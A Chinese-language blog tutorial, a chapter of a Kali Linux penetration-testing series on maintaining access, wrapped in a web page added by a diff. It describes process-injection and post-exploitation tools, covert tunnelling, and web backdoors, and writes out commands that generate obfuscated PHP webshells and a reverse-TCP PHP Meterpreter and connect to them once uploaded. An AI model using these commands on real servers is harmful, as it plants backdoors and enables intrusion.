@@ -1,0 +1,467 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://www.ljjyy.com">
+    <!--SEO-->
+
+    <meta name="keywords" content="linux,kali">
+
+
+    <meta name="description" content="一.维持访问1. 操作系统后门简单来说，所谓后门（backdoor），就是绕过目标系统安全控制体系的正规用户认证过程而维持我们队目标系统的控制权，以及隐匿我们控制行为的方法。
+2. Cymoth...">
+
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+
+    <!--Title-->
+
+
+<title>Kali linux渗透测试之 七.维持访问 | 来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
+    
+
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash">
+
+
+
+
+    
+	<div class="hide">
+        <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+        <script>LA.init({id: "JgbNOaw1xxsmUUsQ",ck: "JgbNOaw1xxsmUUsQ"})</script>
+	</div>
+
+
+
+
+
+
+    
+    <meta name="baidu-site-verification" content="dTHILoORpx">
+
+
+    <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+
+</head>
+
+</html>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+
+<body>
+    <header class="main-header"  >
+    <div class="main-header-box">
+        <!--a class="header-avatar" href="/" title='Ljjyy.com'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a-->
+        <div class="branding">
+            
+                <h2> 多读书多实践，勤思考善领悟 </h2>
+            
+    	  </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                    <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="web-logo"  href="/" title='Ljjyy.com'></a>
+                    <!--a class="navbar-brand" href="https://www.ljjyy.com">来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</a-->
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu" style="">
+                    <ul class="menu">
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/"><i class="fa "></i>首页</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/cloud/"><i class="fa "></i>云计算</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/front/"><i class="fa "></i>前端</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/back/"><i class="fa "></i>后端</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/devops/"><i class="fa "></i>运维</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/crack/"><i class="fa "></i>破解</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/penetration/"><i class="fa "></i>渗透</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/tool/"><i class="fa "></i>工具</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/other/"><i class="fa "></i>其他</a>
+                            </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Kali linux渗透测试之 七.维持访问">
+            
+	            Kali linux渗透测试之 七.维持访问
+            
+        </h1>
+        <div class="post-meta">
+    
+        <span class="categories-meta fa-wrap">
+            <i class="fa fa-folder-open-o"></i>
+            <a class="category-link" href="/categories/penetration/">渗透</a>
+        </span>
+    
+
+    
+        <span class="fa-wrap">
+            <i class="fa fa-tags"></i>
+            <span class="tags-meta">
+                
+                    <a class="tag-link" href="/tags/kali/">kali</a> <a class="tag-link" href="/tags/linux/">linux</a>
+                
+            </span>
+        </span>
+    
+
+    
+        
+        <span class="fa-wrap">
+            <i class="fa fa-clock-o"></i>
+            <span class="date-meta">2019/01/12</span>
+        </span>
+        
+    
+</div>
+            
+            
+            <p class="fa fa-exclamation-triangle warning">
+                本文于<strong>1546</strong>天之前发表，文中内容可能已经过时。
+            </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h1 id="一-维持访问"><a href="#一-维持访问" class="headerlink" title="一.维持访问"></a>一.维持访问</h1><h2 id="1-操作系统后门"><a href="#1-操作系统后门" class="headerlink" title="1. 操作系统后门"></a>1. 操作系统后门</h2><p>简单来说，所谓后门（backdoor），就是绕过目标系统安全控制体系的正规用户认证过程而维持我们队目标系统的控制权，以及隐匿我们控制行为的方法。</p>
+<h2 id="2-Cymothoa"><a href="#2-Cymothoa" class="headerlink" title="2. Cymothoa"></a>2. Cymothoa</h2><p>Cymothoa是一款可以将ShellCode注入到现有进程（插入进程）的后门工具。借助这种注入手段，它能够把ShellCode伪装成常规程序。他说注入的后门程序应当能够与贝注入的程序（进程）共存，以避免被管理或维护人员怀疑。将ShellCode注入到其他进程，还有另外一个优势就是：即使目标系统的安全防护工具能够讲师可执行程序的完整性，只要它不检查内存，那么它就不能发现后门程序（插入进程）的进程。</p>
+<p><img src="/img/posts/20180407170357794.png" alt="img"></p>
+<p>在使用Cymothoa程序时，必须通过-p选项来指定目标进程的PID，并通过-s选项来指定ShellCode的编号。</p>
+<p>你可以在目标主机上使用ps指令，以查看程序的PID信息，另外，你可以使用程序的-s选项列出所有可用的ShellCode对于的编号</p>
+<p><img src="/img/posts/20180407170618317.png" alt="img"></p>
+<p>在渗透到目标主机之后，可以吧Cymothoa的可执行程序复制到目标主机上，继而生成后门程序。</p>
+<h2 id="3-Intersect"><a href="#3-Intersect" class="headerlink" title="3. Intersect"></a>3. Intersect</h2><p>Intersect是一款适合在漏洞利用以后使用的能够自动完成多种后期任务的程序。他能够自动收集密码文件、赋值SSH密钥、收集网络信息，并能识别杀毒软件和防火墙程序。</p>
+<p>若要是他自动执行后期任务，你需要创建自己的脚本文件，脚本中指定所需的各种功能呢。对于Inetersect来说，每个功能就有对应的模块。</p>
+<p><img src="/img/posts/20180407171317892.png" alt="img"></p>
+<p>我们选择一，之后会看到下面信息：<br><img src="/img/posts/20180407171347735.png" alt="img"></p>
+<p>如需要列出所有的模块信息，我们可以使用modules指令。该制冷的而运行效果如下：</p>
+<p><img src="/img/posts/20180407171451590.png" alt="img"></p>
+<p>我们可以通过符号“=&gt;”指定某个模块，或用info指令查看某模块的具体信息。例如，查看creds信息：</p>
+<p><img src="/img/posts/20180407171604286.png" alt="img"></p>
+<h2 id="4-Meterpreter后门"><a href="#4-Meterpreter后门" class="headerlink" title="4. Meterpreter后门"></a>4. Meterpreter后门</h2><p>著名的Metasploit Meterpreter程序自带一个后门程序“metsvc”,它可以让你随时获取Meterpreter的shell</p>
+<p>需要小心的是，metsvc程序没有采用任何认证机制，也就是说，所有发现该后门端口的人镀硬铬能够使用这个后门。</p>
+<h1 id="二-隧道工具"><a href="#二-隧道工具" class="headerlink" title="二.隧道工具"></a>二.隧道工具</h1><h2 id="1-隧道"><a href="#1-隧道" class="headerlink" title="1. 隧道"></a>1. 隧道</h2><p>在计算机领域里，隧道是指使用某个网络协议封装另外一种网络协议的技术手段。在渗透测试中，使用隧道技术主要是为了让目标胸膛呢的防护机制无法发挥作用。多数情况下，目标系统的防火墙会组织内部系统访问外网网络，只放行DNS\HTTP\HTTPS这类常见的网络协议。在这种情况下，如果要在目标系统的内网使用外网的其他网络协议，就需要构建HTTP协议的隧道。这样，防火墙就会放行隧道封装的数据。</p>
+<h2 id="2-dns2tcp"><a href="#2-dns2tcp" class="headerlink" title="2. dns2tcp"></a>2. dns2tcp</h2><p>dns2tcp是一种把TCP数据包伪装成DNS协议数据包的隧道封装工具。它适用于目标主机只能发送DNS请求的网络环境。当它在特定端口受理链接请求时，它会将数据封装为DNS协议格式，在发送到指定主机的指定端口的dns2tcp服务端程序。</p>
+<p>dns2tcp采用了C/S架构，客户单程序叫做dns2tcpc，服务器端程序叫做dns2tcpd</p>
+<p>要启动dns2tcp的服务器程序，可以在终端输入以下命令：</p>
+<p>dns2tcpd</p>
+<p><img src="/img/posts/201804071732142.png" alt="img"></p>
+<p>dns2tcpc</p>
+<p><img src="/img/posts/20180407173231550.png" alt="img"></p>
+<p>在使用dns2tcp之前需要穿件一个指向公网dns2tcp服务器IP的NS记录。建议为dns2tcp的程序分配子域名的DNS记录。例如dnstimnel.myexample.com。</p>
+<p>之后就要配置dns2tcp服务器，默认情况下，dns2tcp服务器端程序会在当前用户的主目录下面寻找文件.dns2tcprcd，将值用作配置文件。</p>
+<h2 id="3-ncat"><a href="#3-ncat" class="headerlink" title="3. ncat"></a>3. ncat</h2><p>ncat是一款集发送、接收、转发、加密数据等多种功能于一身的网络工具。ncat是著名的Netcat程序的改进版。它的功能有：</p>
+<ul>
+<li>它可以用作Web服务程序和其他TCP/IP服务器端程序简易TCP/UDP/SCTP/SSL客户端；</li>
+<li>它可以用作简单的TCP、UDP、SCTP、SSL服务器端程序。</li>
+<li>它可以转发或代理TCP、UDP、SCTP流量</li>
+<li>它可以用作执行系统指令的网络网关</li>
+<li>它可使用SSL技术加密通信数据</li>
+<li>它可以使用IPv4或IPV6技术进行网络传输</li>
+<li>它可用作连接代理，通过第三个中介服务器使用两个或多个客户端互联代理。</li>
+</ul>
+<p><img src="/img/posts/20180407174546826.png" alt="img"></p>
+<h2 id="4-proxychains"><a href="#4-proxychains" class="headerlink" title="4. proxychains"></a>4. proxychains</h2><p>proxychains程序可以强制TCP客户端程序通过指定的代理服务器（或代理链）发起TCP链接。自从3.1版本开始，它支持SOCKS4代理、SOCKET5代理和基于CONNECT模式的HTTP代理服务器。</p>
+<p><img src="/img/posts/20180407174918899.png" alt="img"></p>
+<p><strong>声明代理服务器的格式如下：</strong></p>
+<p>Proxy_type host port [user pass]</p>
+<p>代理服务器类型即：http\socks4\socks5</p>
+<p><strong>如果要使Telnet程序通过代理服务器建立链接，可以使用以下指令：</strong></p>
+<p>proxychains telnet example.com</p>
+<p>上述命令将使Telnet程序通过proxychains配置文集指定的代理服务器登录到example.com的telenet服务。</p>
+<h2 id="5-ptunnel"><a href="#5-ptunnel" class="headerlink" title="5. ptunnel"></a>5. ptunnel</h2><p>ptunnel是一款使用ICMP ping（请求和回复）封装TCP链接的隧道工具。即使被测主机无法向Internet发送任何TCP和UDP的数据，只要它可以向取Internet发起ping命令，那么这款工具就可以帮助它穿越防火墙。ptunnel可以脱离TCP和UDP链接访问E-mail、上网或者进行其他网络活动。</p>
+<p>如需要启动ptunnel，可以在终端使用以下命令：</p>
+<p>ptunnel -h</p>
+<p><img src="/img/posts/20180407175647748.png" alt="img"></p>
+<p>通过上述指令，你可以查看到该工具的使用方法。</p>
+<p>注意：需要配合代理服务器才能在客户端使用ptunnel程序。而且客户端程序所在的主机必须能够访问服务器端主机。另外，如果要在Internet上架设ptunnel服务器端程序，那么服务器端主机就必须使用公网才可以直接访问到IP地址。</p>
+<h2 id="6-其他程序"><a href="#6-其他程序" class="headerlink" title="6. 其他程序"></a>6. 其他程序</h2><ul>
+<li>socat</li>
+<li>sslh</li>
+<li>stunnel4</li>
+</ul>
+<h1 id="三-创建Web后门"><a href="#三-创建Web后门" class="headerlink" title="三.创建Web后门"></a>三.创建Web后门</h1><h2 id="1-WeBaCoo"><a href="#1-WeBaCoo" class="headerlink" title="1. WeBaCoo"></a>1. WeBaCoo</h2><p>WeBaCoo（Web Backdoor Cookie）是一款隐蔽的脚本类Web后门工具。借助HTTP协议，它可以在客户端和服务器端实现执行代码的网页终端。</p>
+<p><strong>WeBaCoo有两种工作模式：</strong></p>
+<ul>
+<li>Generation（生产线模式）：指定-g选项可进入这种模式。用户可以在这种模式下制作PHP代码的payload</li>
+<li>Terminal（终端模式）：指定-t选项可进入这种模式，用户可以在这种模式下连接到被测主机的后门程序。</li>
+</ul>
+<p>WeBaCoo的精妙之处在于，Web服务器和客户端之间的通信载体是Cookie。这就意味着多数的杀毒软件、网络入侵检测/防御系统、网络防火墙和应用程序防火墙都无法检测到后门的所在。</p>
+<p><strong>WeBaCoo的HTTP Cookie中以下三个参数最为重要：</strong></p>
+<ul>
+<li>cm:以base64编码的shell指令</li>
+<li>cn:加载着编码后输出内容的Cookie名称</li>
+<li>cp：封装编码后输出内容的分隔符</li>
+</ul>
+<p>如需启动WeBaCoo程序，可以在终端输入下述命令：<br><img src="/img/posts/20180407181104222.png" alt="img"></p>
+<p>与生成模式有关的命令行选项如下：</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-g</td>
+<td>制作后门代码</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>后门所需要的PHP功能system(default)shell_execexecpassthrupopen</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>指定生成的后门程序的文件名</td>
+</tr>
+</tbody>
+</table>
+<p>如果要使用默认的设置，生成名为test.php的PHP后门程序，并使用WeBaCoo的代码混淆技术对后门进行处理，那么可以使用下述命令</p>
+<p>webacoo  -g    -o    test.php</p>
+<p><img src="/img/posts/2018040718252058.png" alt="img"></p>
+<p><strong>文件test.php内容如下：</strong></p>
+<p><img src="/img/posts/2018040718255989.png" alt="img"></p>
+<p>而后，包这个文件上传到被测主机上去</p>
+<p>接下来就可以使用下面的命令连接到被测主机的后门程序了：</p>
+<p>webacoo -t -u <a href="http://ip/test.php" target="_blank" rel="noopener">http://ip/test.php</a></p>
+<p>WeBaCoo后门的客户端和服务器端的通信是不易发现的、</p>
+<h2 id="2-Weevely"><a href="#2-Weevely" class="headerlink" title="2. Weevely"></a>2. Weevely</h2><p>Weevely是一款具有高隐蔽性的针对PHP平台的WEBShell。它实现了SSH风格的终端界面，并有大量自动化的模块。测试人员可用它来执行系统命令、远程管理和渗透后期的自动渗透界面。</p>
+<p>Weevely的主要用途是：</p>
+<ul>
+<li>生成混淆的PHP backdoor</li>
+<li>在图像文件中追加多态后门程序，并可以通过。htaccess文件赋予图像文件执行权限。</li>
+<li>生成后门。htaccess文件。</li>
+<li>可通过help选项列出程序的全部模块和生成工具</li>
+</ul>
+<p><img src="/img/posts/20180407183433711.png" alt="img"></p>
+<p>使用夏磊指令可以生成混淆PHP backdoor，并将后门保存为display.php</p>
+<p>weevely generate password display.php</p>
+<p>之后还是以一样，上传到目标机器上</p>
+<p>之后链接WEBshell即可</p>
+<h2 id="3-PHP-Meterpreter"><a href="#3-PHP-Meterpreter" class="headerlink" title="3. PHP Meterpreter"></a>3. PHP Meterpreter</h2><p>Metasploit有一个名为PHP Meterpreter的payload。这个模块可以创建具有Meterpreter功能的PHP webShell。利用目标的漏洞（诸如常见的注入、文件上传漏洞）之后，再把它的shell传到目标主机即可。</p>
+<p>Metasploit 的msfvenom工具可以制作PHP Meterpreter，具体指令如下：</p>
+<p>msfvenom -p  php/meterpreter/reverse_tcp LHOST=192.168.x.x   -f   raw &gt;php-meter.php</p>
+<p>上述指令各选项的作用如下：</p>
+<p>-p :指定payload为php/meterpreter/reverse_tcp</p>
+<p>-f：设置输出格式（raw）</p>
+<p>LHOST :设定目标主机的IP地址</p>
+<p>Metasploit会把生成的PHP Meterpreter保存为文件php-mter.php。</p>
+
+    </div>
+    
+    <div class="post-footer">
+        <div>
+            
+                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="/" target="_blank">Ljjyy.com</a>
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+
+<div class="article-nav prev-next-wrap clearfix">
+    
+        <a href="/archives/2019/01/100158.html" class="pre-post btn btn-default" title='网站渗透思路及知识图谱'>
+            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+            <span class="hidden-xs">网站渗透思路及知识图谱</span>
+        </a>
+    
+    
+        <a href="/archives/2019/01/100156.html" class="next-post btn btn-default" title='Kali linux渗透测试之 六.权限提升'>
+            <span class="hidden-lg">下一篇</span>
+            <span class="hidden-xs">Kali linux渗透测试之 六.权限提升</span><i class="fa fa-angle-right fa-fw"></i>
+        </a>
+    
+</div>
+
+
+    <div id="comments">
+        
+	
+    <div id="vcomments" class="valine"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/assets/valine.min.js"></script>
+
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: '5MzTXYXkt03k101j0PmSDN34-gzGzoHsz',
+            appKey: 'iwjYgwno6qj3wtDVVSbe8nYQ',
+            placeholder: '说点什么吧',
+            notify: false,
+            verify: true,
+            avatar: 'mm',
+            meta: 'nick,mail'.split(','),
+            pageSize: '10',
+            path: window.location.pathname,
+            lang: 'zh-CN'.toLowerCase()
+        })
+    </script>
+
+
+    </div>
+
+
+
+
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">文章目录</h3>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一-维持访问"><span class="toc-text">一.维持访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-操作系统后门"><span class="toc-text">1. 操作系统后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Cymothoa"><span class="toc-text">2. Cymothoa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Intersect"><span class="toc-text">3. Intersect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Meterpreter后门"><span class="toc-text">4. Meterpreter后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二-隧道工具"><span class="toc-text">二.隧道工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-隧道"><span class="toc-text">1. 隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-dns2tcp"><span class="toc-text">2. dns2tcp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-ncat"><span class="toc-text">3. ncat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-proxychains"><span class="toc-text">4. proxychains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-ptunnel"><span class="toc-text">5. ptunnel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-其他程序"><span class="toc-text">6. 其他程序</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三-创建Web后门"><span class="toc-text">三.创建Web后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-WeBaCoo"><span class="toc-text">1. WeBaCoo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Weevely"><span class="toc-text">2. Weevely</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-PHP-Meterpreter"><span class="toc-text">3. PHP Meterpreter</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+
+<a id="back-to-top" class="icon-btn hide">
+	<i class="fa fa-chevron-up"></i>
+</a>
+
+
+
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+</div>
+
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy; 2019-2023&emsp;<a href="/" class="copyright-links" target="_blank" rel="nofollow">Ljjyy.com</a>
+                </span> |
+                <span>
+                    <a href="/about/" class="copyright-links" target="_blank" rel="nofollow">关于我们</a>
+                </span> |                
+                <span>
+                    <a href="/sitemap.xml" class="copyright-links" target="_blank" rel="nofollow">网站地图</a>
+                </span> |
+                <span>
+                    <a href="/archives/" class="copyright-links" target="_blank" rel="nofollow">时间轴</a>
+                </span>              
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+<script src="/js/app.js?rev=@@hash"></script>
+
+</body>
+</html>
